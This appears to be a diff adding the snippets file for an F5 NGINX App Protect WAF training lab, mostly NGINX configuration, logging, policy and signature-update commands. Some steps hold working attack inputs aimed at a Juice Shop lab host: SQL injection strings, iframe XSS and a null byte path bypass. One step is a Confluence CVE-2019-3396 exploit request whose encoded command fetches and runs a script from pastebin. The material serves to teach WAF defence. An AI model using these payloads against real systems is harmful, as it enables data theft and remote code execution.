@@ -1,0 +1,892 @@
+# v1.0 by F5 Training Development Group
+# NGINX App Protect Self-paced Training Class snippets lab file
+
+Lab: Verify NGINX Plus Installation and Access the Juice Shop Application
+
+Step 2d
+
+apt list --installed | grep nginx
+
+Step 2f
+
+cat /opt/app_protect/VERSION
+
+Step 3a
+
+nginx -v
+
+Step 4a
+
+ps aux | egrep "nginx|bd"
+
+Step 5a
+
+sudo cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak
+sudo cp /etc/nginx/conf.d/nap.conf /etc/nginx/conf.d/nap.conf.bak
+
+Step 5b (The vim editor is used in this example)
+
+sudo vim /etc/nginx/nginx.conf
+
+Step 5d
+
+load_module modules/ngx_http_app_protect_module.so;
+
+Step 5e
+
+sudo nginx -s reload
+
+
+End of lab 
+
+**************************************************************************************************************
+
+Lab: Exploring the Juice Shop Application
+
+
+No commands are used in this lab.
+
+**************************************************************************************************************
+
+Lab: Exploiting Juice Shop Vulnerabilities
+
+
+Lab Exercise: Retrieve a list of all users with SQL Injection
+
+Step 1a
+
+/rest/products/search?q=qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
+
+
+Lab Exercise: Login as administrator using SQL injection
+
+Step 1b
+
+'or 1=1;--
+
+
+Lab Exercise: Reveal a Cross-Site Scripting Vulnerability
+
+Step 1a
+
+<iframe src="javascript:alert('Hacked!')">
+
+
+Lab Exercise: Try a more complex XSS Attack
+
+Step 3a
+
+<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
+
+Lab Exercise: Access a developer's backup file using a poison null byte character bypass
+
+Step 2a
+
+/ftp/package.json.bak%2500.md
+
+End of lab
+
+**************************************************************************************************************
+
+Lab: Enabling NGINX App Protect
+
+Step 1a
+
+less /etc/nginx/conf.d/nap.conf
+
+Step 2a
+
+http://10.0.0.11/<script>
+
+
+Step 2c
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_enable on;
+
+Step 2e
+sudo nginx -s reload
+
+
+Step 3a
+
+sudo grep APP_PROTECT /var/log/nginx/error.log
+
+Step 5a
+
+http://10.0.0.11/<script>
+
+Step 6a
+
+curl -Iv -H "Host: 1.2.3.4" http://10.0.0.11/
+
+End of lab
+
+**************************************************************************************************************
+
+Lab:  Working with security and access logs
+
+
+Part 1: Enable security logging and log location
+
+Step 1a
+
+sudo vim /etc/nginx/nginx.conf
+    
+    app_protect_security_log_enable on;
+    app_protect_security_log "/etc/app_protect/conf/log_default.json" /var/log/app_protect/class_security.log;
+
+To verify on one line:
+:set number
+
+Step 1b 
+
+sudo nginx -s reload
+
+Step 2a
+
+tail -f /var/log/app_protect/class_security.log
+
+Step 2b
+
+curl http://localhost/?a=%3Cscript%3E
+
+Step 3a
+
+/rest/products/search?q=qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--
+
+Step 4a
+
+curl http://10.0.0.11/index.html
+
+Step 4c
+tail -f /var/log/app_protect/class_security.log | grep --text -w 10.0.0.11
+
+**************************************************************************************************************
+
+Part 2: Create conditional security log
+
+Step 1a
+
+sudo mkdir /etc/app_protect/conf/nap.d
+
+Step 1b
+
+sudo cp /etc/app_protect/conf/log_default.json /etc/app_protect/conf/nap.d/simplify_requests.json
+
+
+Step 2a
+sudo vim /etc/app_protect/conf/nap.d/simplify_requests.json
+
+user-defined
+
+"format_string": "Request ID: %support_id%, Reason: %outcome_reason%, Outcome: %outcome%, Attack Type: %attack_type%, Request Status %request_status%, %method% %uri%, Received on: %date_time% from IP: %ip_client% had the following violations: %violations%, Policy is: %policy_name%",
+
+
+Step 3a
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_security_log "/etc/app_protect/conf/nap.d/simplify_requests.json" /var/log/app_protect/class_simplified_security.log;
+
+Step 3b
+
+sudo nginx -s reload
+
+Step 4a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 4b
+
+curl http://10.0.0.11/
+
+Step 4d
+
+curl http://10.0.0.11/?a=%3Cscript%E
+
+
+**************************************************************************************************************
+
+Part 3: Set NGINX Access Log with Security Variables
+
+Step 1b
+sudo vim /etc/nginx/conf.d/nap.conf
+
+log_format  custom  'NAP support ID: $app_protect_support_id - NAP outcome: $app_protect_outcome - NAP reason: $app_protect_outcome_reason - NAP policy name: $app_protect_policy_name - NAP version: $app_protect_version NGINX request: $request NGINX status: $status';
+
+Step 1c
+
+custom
+
+Step 1e
+
+sudo nginx -s reload
+
+Step 2a
+
+curl http://10.0.0.11/ftp/coupons_2013.md.bak
+
+
+Step 3a
+
+sudo grep coupons_2013.md.bak /var/log/nginx/access.log
+
+Step 3c
+
+curl http://10.0.0.11/?a=%3Cscript%3E
+
+Step 3d
+
+sudo grep REJECTED /var/log/nginx/access.log
+
+End of lab
+
+**************************************************************************************************************
+
+Setting Policy
+
+
+Part 1: Creating a Transparent Policy
+
+
+Step 1a
+
+cat /etc/app_protect/conf/NginxDefaultPolicy.json
+
+Step 1c
+sudo /opt/app_protect/bin/convert-policy -i /etc/app_protect/conf/NginxDefaultPolicy.json -o /tmp/my-default-policy.json --full-export
+
+Step 1d-e-f
+less /tmp/my-default-policy.json
+
+/enforcementMode
+
+q
+
+Step 2a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_transparent.json
+
+{
+ "policy": {
+    "name": "policy_transparent",
+    "template": { "name":  "POLICY_TEMPLATE_NGINX_BASE" },
+    "applicationLanguage": "utf-8",
+    "enforcementMode": "transparent",
+    "bot-defense" : {
+        "settings": {
+            "isEnabled": false
+        }
+    }    
+ }
+}
+
+Step 3a
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/nap.d/policy_transparent.json";
+
+Step 3c
+
+sudo nginx -s reload
+
+Step 4a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 4b
+
+curl http://10.0.0.11/?3Cscript%3E
+
+**************************************************************************************************************
+
+Part 2: Write a Policy to Block and Alarm HTTP Protocol violations
+
+Step 1a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_http.json
+
+{
+    "policy": {
+        "name": "policy_viol_http",
+        "template": { "name": "POLICY_TEMPLATE_NGINX_BASE" },
+        "applicationLanguage": "utf-8",
+        "enforcementMode": "blocking",
+        "blocking-settings": {
+            "violations": [
+                {
+                    "name": "VIOL_HTTP_PROTOCOL",
+                    "alarm": true,
+                    "block": true
+                }
+            ]
+        }
+    }
+}
+
+
+Step 2a-b
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/nap.d/policy_viol_http.json";
+
+#    
+
+Step 2c
+
+sudo nginx -s reload
+
+Step 3a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 3b
+
+curl -H "Host: 1.2.3.4" http://10.0.0.11/
+
+Step 3d
+
+grep contains /opt/app_protect/install/policy_templates/nginx_base.xml 
+
+Step 4a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_http.json
+
+Step 4b
+
+false
+
+Step 4c
+
+sudo nginx -s reload
+
+Step 5a
+
+curl -H "Host: 1.2.3.4" http://10.0.0.11/
+
+**************************************************************************************************************
+
+Part 3: Working with Evasion Technique violations
+
+Step 1a
+
+curl http://10.0.0.11/%09/
+
+Step 1c
+less /tmp/my-default-policy.json
+/VIOL_EVASION
+
+Step 2a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_evasion.json
+
+{
+    "policy": {
+     "name": "policy_viol_evasion",
+    "template": { "name": "POLICY_TEMPLATE_NGINX_BASE" },
+     "applicationLanguage": "utf-8",
+     "enforcementMode": "blocking",
+     "blocking-settings": {
+         "violations": [
+         {
+             "name": "VIOL_EVASION",
+             "alarm": true,
+             "block": true
+         }
+         ]
+      }
+    }
+}
+
+Step 2c
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/nap.d/policy_viol_evasion.json";
+
+Step 2d
+
+sudo nginx -s reload
+
+Step 3a
+
+curl http://10.0.0.11/%09/
+
+Step 4a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_evasion.json
+
+
+ ,
+            "evasions": [
+            {
+               "description": "Apache whitespace",
+               "enabled": false
+           }
+           ]
+
+Step 4b
+
+sudo nginx -s reload
+
+Step 5a
+
+curl http://10.0.0.11/%09/
+
+**************************************************************************************************************
+
+Part 4: Working with File Type Violations
+
+Step 1a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_filetype.json
+
+{
+    "policy": 
+    {
+        "name": "policy_viol_filetype",
+        "template": { "name": "POLICY_TEMPLATE_NGINX_BASE" },
+        "applicationLanguage": "utf-8",
+        "enforcementMode": "blocking",
+        "blocking-settings": 
+        {
+            "violations":[
+                {
+                    "name": "VIOL_FILETYPE",
+                    "alarm": true,
+                    "block": true
+                }
+            ]
+        }
+    }
+}
+
+Step 1c
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/nap.d/policy_viol_filetype.json";
+
+#
+
+Step 1d
+sudo nginx -s reload
+
+Step 2a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 2b
+
+curl http://10.0.0.11/index.php
+
+Step 2d
+
+curl http://10.0.0.11/index.exe
+
+Step 2f
+
+awk '/disallowed_file/,/\/disallowed_file/' /opt/app_protect/install/policy_templates/nginx_base.xml
+
+Step 4a
+
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_filetype.json
+
+{
+  "policy": {
+    "name": "policy_viol_filetype",
+    "template": {
+      "name": "POLICY_TEMPLATE_NGINX_BASE"
+    },
+    "applicationLanguage": "utf-8",
+    "enforcementMode": "blocking",
+    "blocking-settings": {
+      "violations": [
+        {
+          "name": "VIOL_FILETYPE",
+          "alarm": true,
+          "block": true
+        }
+      ]
+    },
+    "filetypes": [
+      {
+        "name": "md",
+        "type": "explicit",
+        "allowed": false
+      }
+    ]
+  }
+}
+
+Step 4b
+
+sudo nginx -s reload
+
+**************************************************************************************************************
+
+Part 5: Deploying a Strict Policy
+
+Step 1a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 2a
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/NginxStrictPolicy.json";
+
+Step 2b
+
+sudo nginx -s reload
+
+Step 3a
+
+curl http://10.0.0.11/%09
+
+End of lab
+
+**************************************************************************************************************
+
+Using Multiple Policies and External Policy References
+
+Part 1: Associate the Default Policy with the HTTP Context
+
+Step 1a
+
+sudo vim /etc/nginx/nginx.conf
+
+# app_protect_policy_file "/etc/app_protect/conf/NginxStrictPolicy.json";
+
+Step 1b
+
+    app_protect_policy_file "/etc/app_protect/conf/NginxDefaultPolicy.json";
+
+
+Step 2a
+
+sudo vim /etc/nginx/conf.d/nap.conf
+
+
+Step 2b
+
+    location /ftp {
+        app_protect_policy_file "/etc/app_protect/conf/nap.d/policy_viol_filetype.json";
+        proxy_pass http://juice_server;
+    }
+
+Step 2c 
+
+sudo nginx -s reload
+
+Step 3a
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 3b
+
+curl http://10.0.0.11/index.html
+curl http://10.0.0.11/file.md
+
+Step 4a
+
+curl http://10.0.0.11/ftp/acquisitions.md
+
+
+
+**************************************************************************************************************
+
+Part 2: Set External Reference for the Policy
+
+Step 1a
+
+sudo vim /etc/app_protect/conf/my-filetypes.txt
+
+
+Step 1b
+
+[
+    {
+        "name": "*",
+        "type": "wildcard",
+        "allowed": true,
+        "checkPostDataLength": false,
+        "postDataLength": 4096,
+        "checkRequestLength": false,
+        "requestLength": 8192,
+        "checkUrlLength": true,
+        "urlLength": 2048,
+        "checkQueryStringLength": true,
+        "queryStringLength": 2048,
+        "responseCheck": false
+    },
+    {
+        "name": "pat",
+        "allowed": false
+    },
+    {
+        "name": "mat",
+        "allowed": false
+    }
+]
+
+
+Step 2a
+
+sudo vim /etc/app_protect/conf/nap.d/local-policy.json
+
+{
+    "name": "my_local_resources_file_types",
+    "template": {
+        "name": "POLICY_TEMPLATE_NGINX_BASE"
+    },
+    "applicationLanguage": "utf-8",
+    "enforcementMode": "blocking",
+    "blocking-settings": {
+        "violations": [
+            {
+                "name": "VIOL_FILETYPE",
+                "alarm": true,
+                "block": true
+            }
+        ]
+    },
+    "filetypeReference": {
+        "link": "file:///my-filetypes.txt"
+    }
+}
+
+Step 2c
+
+sudo vim /etc/nginx/nginx.conf
+
+    app_protect_policy_file "/etc/app_protect/conf/nap.d/local-policy.json";
+
+Step 2d
+
+sudo nginx -s reload
+
+Step 2e
+
+tail -f /var/log/app_protect/class_simplified_security.log
+
+Step 3a
+
+curl http://10.0.0.11/index.html
+curl http://10.0.0.11/file.php
+curl http://10.0.0.11/file.md
+
+Step 4a
+
+curl http://10.0.0.11/index.pat
+curl http://10.0.0.11/index.mat
+
+Step 5a
+
+curl http://10.0.0.11/?a=%3Cscript%3E
+
+Step 5c
+
+curl http://10.0.0.11/ftp/acquisitions.md
+
+End of lab
+
+**************************************************************************************************************
+
+Updating Attack Signatures and Threat Campaigns
+
+Part 1: Update Attack Signatures
+
+Step 1c
+
+sudo /opt/app_protect/bin/get-signatures -o /tmp/signature-report.json | jq
+
+cat /tmp/signature-report.json | jq '.revisionDatetime'
+
+Step 2a
+
+printf "deb https://pkgs.nginx.com/app-protect-security-updates/ubuntu/ `lsb_release -cs` nginx-plus\n" | sudo tee /etc/apt/sources.list.d/app-protect-security-updates.list
+
+
+Step 3a
+
+cd
+
+Step 3b
+
+wget https://cs.nginx.com/static/keys/app-protect-security-updates.key && sudo apt-key add app-protect-security-updates.key
+
+Step 3c
+
+cat $HOME/app-protect-security-updates.key
+
+
+Step 3d 
+ls -l /etc/apt/apt.conf.d/90app-protect-security-updates
+
+
+Step 3e
+*********
+ONLY do this command if the above file does NOT exist:
+
+sudo wget -P /etc/apt/apt.conf.d https://cs.nginx.com/static/files/90app-protect-security-updates
+*********
+
+
+Step 4a
+
+cat /etc/apt/apt.conf.d/90app-protect-security-updates
+
+
+Step 5a
+
+sudo apt-cache policy app-protect-attack-signatures | more
+
+Step 5c
+
+sudo apt-get update && sudo apt-get install app-protect-attack-signatures
+
+Step 5d
+
+sudo nginx -s reload
+
+Step 6a
+
+apt list --installed | grep app-protect
+
+Step 6c
+
+apt list --installed | grep app-protect-attack
+
+Step 6d
+
+sudo /opt/app_protect/bin/get-signatures -o /tmp/new-signature-report.json | jq
+
+cat /tmp/new-signature-report.json | jq '.revisionDatetime'
+
+**************************************************************************************************************
+
+Part 2: Install/Update Threat Campaigns
+
+Step 1a
+apt list --installed | grep app-protect-threat
+
+Step 1b
+
+sudo apt-cache policy app-protect-threat-campaigns | more
+
+Step 2b
+
+sudo apt-get update && sudo apt-get install app-protect-threat-campaigns
+
+Step 2c
+
+sudo nginx -s reload
+
+Step 2d
+
+apt list --installed | grep app-protect-threat
+
+Step 3a
+
+curl -d "{%22contentId%22:%2212345%22,%22macro%22:{%22name%22:%22widget%22,%22body%22:%22%22,%22params%22:{%22url%22:%22http://www.dailymotion.com/video/xcpa64%22,%22width%22:%22300%22,%22height%22:%22200%22,%22_template%22:%22https://raw.githubusercontent.com/Yt1g3r/CVE-2019-3396_EXP/master/cmd.vm%22,%22cmd%22:%22bash -c {echo,KCh3Z2V0IC1xIC1PLSBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIgfHwgY3VybCAtZnNTTCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcveHZmeHBydGIpIHwgYmFzZTY0IC1kKSB8IHNo}|{base64,-d}|{bash,-i}%22}}}" -X POST http://10.0.0.11
+
+
+End of lab
+
+**************************************************************************************************************
+
+Troubleshooting
+
+
+Part 1: Troubleshooting an NGINX Configuration File Error
+
+
+Step 1a
+
+sudo vim /etc/nginx/nginx.conf
+
+app_protect_policy_file "/etc/nginx/nap.d/local-policyWRONG.json
+
+Step 1b
+
+sudo nginx -s reload
+
+Step 2a
+
+sudo tail /var/log/nginx/error.log
+
+**************************************************************************************************************
+
+Part 2: Solve a Policy Syntax Error
+
+Step 1a
+
+sudo vim /etc/nginx/nginx.conf
+
+Step 2a
+sudo vim /etc/app_protect/conf/nap.d/policy_viol_filetype.json
+
+Step 2d
+
+sudo tail /var/log/nginx/error.log
+
+
+**************************************************************************************************************
+
+Part 3: Gather support files (tarball)
+
+Step 1a
+
+cat /opt/app_protect/VERSION > /tmp/package_versions.txt
+
+Step 1b
+
+apt list --installed | grep -E 'nginx-plus|app-protect' >> /tmp/package_versions.txt
+
+Step 2a
+
+cat /etc/os-release > /tmp/system_version.txt
+
+
+Step 2b
+
+uname -r >> /tmp/system_version.txt
+
+Step 2c
+
+cat /proc/version >> /tmp/system_version.txt
+
+
+Step 3a
+
+cat /tmp/system_version.txt
+
+Step 4a
+
+vim /tmp/logs.txt
+
+/tmp/package_versions.txt
+/tmp/system_version.txt
+/var/log/app_protect/*
+/var/log/nginx/*
+/etc/nginx/nginx.conf
+/etc/nginx/conf.d/*
+/etc/app_protect/conf/nap.d/*
+
+
+Step 4b
+
+sudo tar cvzf /tmp/logs.tgz `cat /tmp/logs.txt`
+
+ls -ltr /tmp
+
+tar tvzf /tmp/logs.tgz
+
+End of snippets file
+
+**************************************************************************************************
